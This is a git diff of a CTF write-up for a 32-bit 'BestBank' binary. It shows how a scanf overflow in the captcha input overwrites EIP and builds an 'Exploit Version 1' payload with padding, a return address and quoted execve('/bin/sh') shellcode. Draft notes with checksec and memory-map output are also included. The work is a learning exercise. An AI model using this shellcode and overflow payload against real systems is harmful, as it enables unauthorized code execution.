@@ -22,7 +22,7 @@ $ file bank
 bank: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=26163dec7eb11546fe50a0db8bdae0ea79be8939, stripped
 ```
 
-Add run permissions and run the binary. Play around with the options and get a feel for the program:
+Add execute permissions and run the binary. Play around with the options and get a feel for the program:
 ```
 $ chmod +x bank
 $ ./bank
@@ -129,7 +129,7 @@ checkBalance()          option 3: [3] Check Balance
 exit(0)                 option 4: [4] Exit
 ```
 
-Inspect the `deposit` and `withdraw` functions. Both features require a captcha to proceed. This is also reflected in the code. This is the `withdraw` function:
+Inspect the `deposit` and `withdraw` functions. Both features require a captcha to proceed. This is reflected in the code. This is the `withdraw` function with the `captcha` check:
 ```c
 void withdraw(void)
 {
@@ -145,7 +145,7 @@ void withdraw(void)
 }
 ```
 
-Inspect the `captcha` function. The captcha command accepts a variable length input, as noted from the initial run.
+Inspect the `captcha` function. The `puts` method prints the **b3sTbAnK** ASCII art to the screen. Then the `__isoc99_scanf` method gets user input and stores it in `userCaptcha`, which is an array of 1000 characters.
 ```c
 uint captcha(void)
 {
@@ -174,9 +174,333 @@ uint captcha(void)
 }
 ```
 
-# Stopped here
+The full decompiled program can be viewed here: [bank.c](bank.c).
 
+### Segmentation Fault
+
+What would happen if more than 1000 characters are sent to the `captcha` method? Build a quick payload file with python:
+```
+$ python3 -c "print('1 ' + 'A'*1012)"
+1 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA ...
+```
+
+According to [GeeksforGeeks][2], `scanf` "is used to read the input until it encounters a whitespace, newline or End Of File(EOF)." When the `bank` program receives the payload of `1 AAAAAA...`, `scanf` will first scan the "1" and stop at the space. Then at the next `scanf` call, the function will scan the string of "A"s.
+
+Send the payload to the program:
+```
+$ python3 -c "print('1 ' + 'A'*1012)" > payload
+$ ./bank temp < payload
+Welcome to the Best Bank!
+Current balance: $500
+...
+Captcha: Incorrect!
+
+Segmentation fault (core dumped)
+```
+
+A captcha input of 1012 characters or more results in a segmentation fault. Anything less does not. This 1012 character limit was determined through trial and error.
+
+### Debug with GDB
+
+Find out what caused the segmentation fault. Open the program in gdb. Run the program with the payload:
+```
+$ env - gdb bank
+(gdb) set disassembly-flavor intel
+(gdb) run < payload
+Starting program: /lhc/Pwn/BestBank/bank < payload
+...
+Captcha: Incorrect!
+
+Program received signal SIGSEGV, Segmentation fault.
+0x41414141 in ?? ()
+```
+Note that the `env -` command removes environment variables, including variables that modify gdb like [gdb-dashboard][3]. This write-up assumes a default gdb environment. However, [gdb-dashboard][3] is **highly recommended**. 
+
+Inspect the registers: 
+```
+(gdb) info registers
+...
+ebp            0x41414141	0x41414141
+...
+eip            0x41414141	0x41414141                  
+```
+
+As shown above, the `eip` (instruction pointer) and `ebp` (stack base pointer) registers have been overwritten with `0x41414141`, which is "AAAA" in hex. The payload has successfully overwritten the instruction pointer, which can control the flow of the program.
+
+Examine the instruction pointer:
+```
+(gdb) x $eip 
+0x41414141:	Cannot access memory at address 0x41414141
+```
+
+The program cannot access the memory at the overwritten address `0x41414141`, which results in a segmentation fault.
+
+Now take a closer look at what is happening in the program. Set a breakpoint at the `scanf` function:
+```
+(gdb) info functions scanf
+All functions matching regular expression "scanf":
+
+Non-debugging symbols:
+0x08049080  __isoc99_scanf@plt
+
+(gdb) break __isoc99_scanf@plt
+Breakpoint 1 at 0x8049080
+```
+
+Verify the breakpoint was setup correctly:
+```
+(gdb) info breakpoints
+Num     Type           Disp Enb Address    What
+1       breakpoint     keep y   0x08049080 <__isoc99_scanf@plt>
+```
+
+Define a gdb function called [hook-stop](https://youtu.be/HSlhY4Uy8SA?t=92) that will print the current instruction and the stack when the program hits a breakpoint:
+```
+(gdb) define hook-stop
+Type commands for definition of "hook-stop".
+End with a line saying just "end".
+>x/1i $eip
+>x/16wx $esp
+>end
+(gdb) 
+```
+
+The two `x` (examine) commands breakdown like this:
+```
+x/1i $eip       ; examine 1 instruction starting from $eip address
+x/16wx $esp     ; examine 16 words in hex starting from $esp address
+```
+
+Run the program with the payload. Continue until the captcha appears and the program hits the captcha's `scanf` breakpoint. 
+```
+(gdb) run < payload
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/zionperez/Desktop/playgrounds/lhc/Pwn/BestBank/bank < payload
+Welcome to the Best Bank!
+Current balance: $500
+
+Options:
+[1] Withdraw
+[2] Deposit
+[3] Check Balance
+[4] Exit
+Enter your choice: => 0x8049080 <__isoc99_scanf@plt>:	jmp    DWORD PTR ds:0x804c020
+0xffffdd7c:	0x08049489	0x0804a137	0xffffdd9c	0xffffdda8
+0xffffdd8c:	0x08049464	0x00000001	0xffffde54	0xffffde5c
+0xffffdd9c:	0x0804950b	0xffffddc0	0x00000000	0x00000000
+0xffffddac:	0xf7df0e81	0xf7fb0000	0xf7fb0000	0x00000000
+
+Breakpoint 1, 0x08049080 in __isoc99_scanf@plt ()
+(gdb) c
+Continuing.
+ _    _____    _____ _       _          _  __
+| |__|___ / __|_   _| |__   / \   _ __ | |/ /
+| '_ \ |_ \/ __|| | | '_ \ / _ \ | '_ \| ' /
+| |_) |__) \__ \| | | |_) / ___ \| | | | . \
+|_.__/____/|___/|_| |_.__/_/   \_\_| |_|_|\_\
+
+Captcha: => 0x8049080 <__isoc99_scanf@plt>:	jmp    DWORD PTR ds:0x804c020
+0xffffd94c:	0x08049221	0x0804a0f7	0xffffd974	0x00000002
+0xffffd95c:	0x080491c1	0x00010001	0x00381ea0	0x62808426
+0xffffd96c:	0x62547333	0x004b6e41	0xffffd970	0xf7fdf289
+0xffffd97c:	0x000000d5	0xf7dd9cb8	0x677f9a5f	0xf7fd0110
+
+Breakpoint 1, 0x08049080 in __isoc99_scanf@plt ()
+```
+
+Use the `finish` command after the captcha's `scanf` call:
+```
+(gdb) finish
+Run till exit from #0  0x08049080 in __isoc99_scanf@plt ()
+=> 0x8049221:	add    esp,0x10
+0xffffd950:	0x0804a0f7	0xffffd974	0x00000002	0x080491c1
+0xffffd960:	0x00010001	0x00381ea0	0x62808426	0x62547333
+0xffffd970:	0x004b6e41	0x41414141	0x41414141	0x41414141
+0xffffd980:	0x41414141	0x41414141	0x41414141	0x41414141
+0x08049221 in ?? ()
+```
+
+Note that the `help` function can explain any unfamiliar command like `finish`:
+```
+(gdb) help finish
+Execute until selected stack frame returns.
+Usage: finish
+Upon return, the value returned is printed and put in the value history.
+```
+
+At this point `scanf` has already scanned in the payload of "A"s, which are visible on the stack as `0x41414141`:
+```
+0xffffd970:	0x004b6e41	0x41414141	0x41414141	0x41414141
+0xffffd980:	0x41414141	0x41414141	0x41414141	0x41414141
+```
+
+Now that `scanf` has completed, the program returned back to the `captcha` function. Examine about 30 instructions starting from the current instruction.
+```
+(gdb) x/30i $eip
+=> 0x8049221:	add    esp,0x10
+   0x8049224:	sub    esp,0x4
+   0x8049227:	push   0x8
+   0x8049229:	lea    eax,[ebp-0x3fd]
+   0x804922f:	push   eax
+   0x8049230:	lea    eax,[ebp-0x3f4]
+   0x8049236:	push   eax
+   0x8049237:	call   0x8049090 <strncmp@plt>
+   0x804923c:	add    esp,0x10
+   0x804923f:	test   eax,eax
+   0x8049241:	jne    0x804925c
+   0x8049243:	sub    esp,0xc
+   0x8049246:	lea    eax,[ebx-0x1f06]
+   0x804924c:	push   eax
+   0x804924d:	call   0x8049050 <puts@plt>
+   0x8049252:	add    esp,0x10
+   0x8049255:	mov    eax,0x1
+   0x804925a:	jmp    0x8049273
+   0x804925c:	sub    esp,0xc
+   0x804925f:	lea    eax,[ebx-0x1efc]
+   0x8049265:	push   eax
+   0x8049266:	call   0x8049050 <puts@plt>
+   0x804926b:	add    esp,0x10
+   0x804926e:	mov    eax,0x0
+   0x8049273:	mov    ebx,DWORD PTR [ebp-0x4]
+   0x8049276:	leave  
+   0x8049277:	ret    
+   0x8049278:	push   ebp
+   0x8049279:	mov    ebp,esp
+   0x804927b:	push   ebx  
+```
+
+Notice that these instructions match with the `captcha` function in [bank.c](bank.c):
+```
+Assembly                                        bank.c
+==========================                      ==========================
+0x8049237:	call   0x8049090 <strncmp@plt>      strncmp(userCaptcha,(char *)&b3sT,8);
+0x8049241:	jne    0x804925c                    if (result != 0)
+0x804924d:	call   0x8049050 <puts@plt>         puts("Correct!\n");
+0x8049266:	call   0x8049050 <puts@plt>         puts("Incorrect!\n");
+```
+
+Set a breakpoint at the `leave` instruction:
+```
+(gdb) break *0x8049276
+Breakpoint 2 at 0x8049276
+```
+
+Note that [leave][6] is equivalent to:
+```
+mov  esp,ebp     # set stack pointer $esp to equal the base pointer $ebp
+pop  ebp         # pop top value of stack and store into $ebp
+```
+
+And [ret][7] is equivalent to:
+```
+pop ecx         # pop top of the stack and store it in $ecx
+jmp ecx         # jump to $ecx
+```
+
+Verify the offset that the $eip is written to. Modify the payload so that the last four bytes are "BBBB". Then run the payload with gdb:
+```
+$ python3 -c "print('1 ' + 'A'*1008 + 'BBBB')" > payload
+$ gdb bank
+```
+
+### Exploit Version 1
+
+At this point, it's tempting to write shell code to the stack and jump to the shell code address per the instructions in [LiveOverflow's video][4]. Give this approach a try. 
+
+First find a good address to return to. Open up gdb. 
+
+Use the shell code LiveOverflow suggested by [Shell Storm: Linux x86 execve("/bin/sh")][5]:
+```
+/*
+Title:	Linux x86 execve("/bin/sh") - 28 bytes
+Author:	Jean Pascal Pereira <pereira@secbiz.de>
+Web:	http://0xffe4.org
+
+
+Disassembly of section .text:
+
+08048060 <_start>:
+ 8048060: 31 c0                 xor    %eax,%eax
+ 8048062: 50                    push   %eax
+ 8048063: 68 2f 2f 73 68        push   $0x68732f2f
+ 8048068: 68 2f 62 69 6e        push   $0x6e69622f
+ 804806d: 89 e3                 mov    %esp,%ebx
+ 804806f: 89 c1                 mov    %eax,%ecx
+ 8048071: 89 c2                 mov    %eax,%edx
+ 8048073: b0 0b                 mov    $0xb,%al
+ 8048075: cd 80                 int    $0x80
+ 8048077: 31 c0                 xor    %eax,%eax
+ 8048079: 40                    inc    %eax
+ 804807a: cd 80                 int    $0x80
+*/
+
+#include <stdio.h>
+
+char shellcode[] = "\x31\xc0\x50\x68\x2f\x2f\x73"
+                   "\x68\x68\x2f\x62\x69\x6e\x89"
+                   "\xe3\x89\xc1\x89\xc2\xb0\x0b"
+                   "\xcd\x80\1bx31\xc0\x40\xcd\x80";
+
+int main()
+{
+  fprintf(stdout,"Lenght: %d\n",strlen(shellcode));
+  (*(void  (*)()) shellcode)();
+}
+```
+
+Create the payload with a [python](exploit1.py) script:
+```python
+#!/usr/bin/python3
+import struct
+
+eip = struct.pack("I", 0xdeadbeef)
+shellcode =  b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\1bx31\xc0\x40\xcd\x80'
+payload = b'A' * 1008 + eip + shellcode
+
+with open("payload", "wb") as handle:
+    handle.write(payload)
+```
+
+# TODO
+TODO: remove all /zionperez/ folder names
 ## Draft Section
+```
+$ checksec bank
+[*] '/home/zionperez/Desktop/playgrounds/lhc/Pwn/BestBank/bank'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX disabled
+    PIE:      No PIE (0x8048000)
+    RWX:      Has RWX segments
+zionperez@zionperez-Z170X-UD3:~/Desktop/playgrounds/lhc/Pwn/BestBank$ pidof bank
+zionperez@zionperez-Z170X-UD3:~/Desktop/playgrounds/lhc/Pwn/BestBank$ pidof bank
+16264
+zionperez@zionperez-Z170X-UD3:~/Desktop/playgrounds/lhc/Pwn/BestBank$ cat proc/16264/maps
+cat: proc/16264/maps: No such file or directory
+zionperez@zionperez-Z170X-UD3:~/Desktop/playgrounds/lhc/Pwn/BestBank$ cat proc/
+cat: proc/: No such file or directory
+zionperez@zionperez-Z170X-UD3:~/Desktop/playgrounds/lhc/Pwn/BestBank$ cat /proc/16264/maps
+08048000-0804b000 r-xp 00000000 fd:01 2441960                            /home/zionperez/Desktop/playgrounds/lhc/Pwn/BestBank/bank
+0804b000-0804c000 r-xp 00002000 fd:01 2441960                            /home/zionperez/Desktop/playgrounds/lhc/Pwn/BestBank/bank
+0804c000-0804d000 rwxp 00003000 fd:01 2441960                            /home/zionperez/Desktop/playgrounds/lhc/Pwn/BestBank/bank
+f7d0c000-f7ee1000 r-xp 00000000 fd:01 8130741                            /lib/i386-linux-gnu/libc-2.27.so
+f7ee1000-f7ee2000 ---p 001d5000 fd:01 8130741                            /lib/i386-linux-gnu/libc-2.27.so
+f7ee2000-f7ee4000 r-xp 001d5000 fd:01 8130741                            /lib/i386-linux-gnu/libc-2.27.so
+f7ee4000-f7ee5000 rwxp 001d7000 fd:01 8130741                            /lib/i]linux-gnu/libc-2.27.so
+f7ee5000-f7ee8000 rwxp 00000000 00:00 0 
+f7f04000-f7f06000 rwxp 00000000 00:00 0 
+f7f06000-f7f09000 r--p 00000000 00:00 0                                  [vvar]
+f7f09000-f7f0a000 r-xp 00000000 00:00 0                                  [vdso]
+f7f0a000-f7f30000 r-xp 00000000 fd:01 8130737                            /lib/i386-linux-gnu/ld-2.27.so
+f7f30000-f7f31000 r-xp 00025000 fd:01 8130737                            /lib/i386-linux-gnu/ld-2.27.so
+f7f31000-f7f32000 rwxp 00026000 fd:01 8130737                            /lib/i386-linux-gnu/ld-2.27.so
+ffc2d000-ffc4e000 rwxp 00000000 00:00 0                                  [stack]
+```
+
+On further research, the `scanf` function appears to be vulnerable to overflow attacks. According to [Wikipedia][1]: uses of %s placeholders without length specifiers are inherently insecure and exploitable for buffer overflows. 
+
 Important breakpoints:
 ```
 >>> info breakpoints
@@ -442,57 +766,10 @@ to compile with 32 bit:
 Command: gcc -m32 geek.c -o geek
 ```
 
-shellcode:
-http://shell-storm.org/shellcode/files/shellcode-811.php
-```
-/*
-Title:	Linux x86 execve("/bin/sh") - 28 bytes
-Author:	Jean Pascal Pereira <pereira@secbiz.de>
-Web:	http://0xffe4.org
-
-
-Disassembly of section .text:
-
-08048060 <_start>:
- 8048060: 31 c0                 xor    %eax,%eax
- 8048062: 50                    push   %eax
- 8048063: 68 2f 2f 73 68        push   $0x68732f2f
- 8048068: 68 2f 62 69 6e        push   $0x6e69622f
- 804806d: 89 e3                 mov    %esp,%ebx
- 804806f: 89 c1                 mov    %eax,%ecx
- 8048071: 89 c2                 mov    %eax,%edx
- 8048073: b0 0b                 mov    $0xb,%al
- 8048075: cd 80                 int    $0x80
- 8048077: 31 c0                 xor    %eax,%eax
- 8048079: 40                    inc    %eax
- 804807a: cd 80                 int    $0x80
-*/
-
-#include <stdio.h>
-
-char shellcode[] = "\x31\xc0\x50\x68\x2f\x2f\x73"
-                   "\x68\x68\x2f\x62\x69\x6e\x89"
-                   "\xe3\x89\xc1\x89\xc2\xb0\x0b"
-                   "\xcd\x80\1bx31\xc0\x40\xcd\x80";
-
-int main()
-{
-  fprintf(stdout,"Lenght: %d\n",strlen(shellcode));
-  (*(void  (*)()) shellcode)();
-}
-```
-
-
 ```
 $ gcc -m32 -z execstack -ggdb -fno-stack-protector scanf.c -o scan.o
 ```
 
-https://stackoverflow.com/questions/20129107/what-is-the-x86-ret-instruction-equivalent-to
-`ret` is equivalent to:
-```
-pop ecx  ; these two instructions simulate "ret"
-jmp ecx
-```
 
 
 ```
@@ -660,17 +937,7 @@ Software security - Return Oriented Programming - ROP
 https://www.youtube.com/watch?v=XZa0Yu6i_ew
 
 
-https://stackoverflow.com/questions/29790175/assembly-x86-leave-instruction/29790275
-leave is exactly equivalent to:
-```
-mov  rsp,rbp     # rsp = rbp
-pop  rbp         # pop top value of stack (whatever rsp is pointing to) and store into ebp
 
-                 # before: rbp 0x00007fffffffde70   rsp 0x00007fffffffde50
-                 # move rsp, rbp ==> rsp = 0x00007fffffffde70
-                 # pop rbp ==> rsp pointing to: 
-                 # after:  rbp 0x4443434343424242   rsp: 0x00007fffffffde70 + 8
-```
 0x08049275 : cld ; leave ; ret
 
 We already overwrote the base pointer. The leave command stores the base pointer into the rsp. then pops top of stack into rbp!!
@@ -1019,3 +1286,18 @@ Started this challenge on 05 June 2020. Completed the challenge on 13 June 2020.
 This challenge involved an incredible amount of trial-and-error. However, the solution write-up skips most of these trials and instead details the best path to get to the goal. While the solution is important, it is the journey that makes it memorable and worthwhile. In that journey, I have learned about addrses space layout randomization (ASLR), format string exploits, the global offset table (GOT), the procedure linkage table (PLT), stack canaries, and many other concepts. These concepts and others have been linked in the resources section below.
 
 ## Resources
+* [Wikipedia: scanf format string][1]
+* [GeeksforGeeks: Difference between scanf() and gets() in C][2]
+* [GDB Dashboard][3]
+* [LiveOverflow: First Exploit! Buffer Overflow with Shellcode - bin 0x0E][4]
+* [Shell Storm: Linux x86 execve("/bin/sh")][5]
+* [StackOverflow: Assembly "leave" instruction][6]
+* [StackOverflow: What is x86 "ret" instruction equivalent to?][7]
+
+[1]:https://en.wikipedia.org/wiki/Scanf_format_string#Vulnerabilities
+[2]:https://www.geeksforgeeks.org/difference-between-scanf-and-gets-in-c/
+[3]:https://github.com/cyrus-and/gdb-dashboard
+[4]:https://youtu.be/HSlhY4Uy8SA
+[5]:http://shell-storm.org/shellcode/files/shellcode-811.php
+[6]:https://stackoverflow.com/questions/29790175/assembly-x86-leave-instruction/29790275
+[7]:https://stackoverflow.com/questions/20129107/what-is-the-x86-ret-instruction-equivalent-to
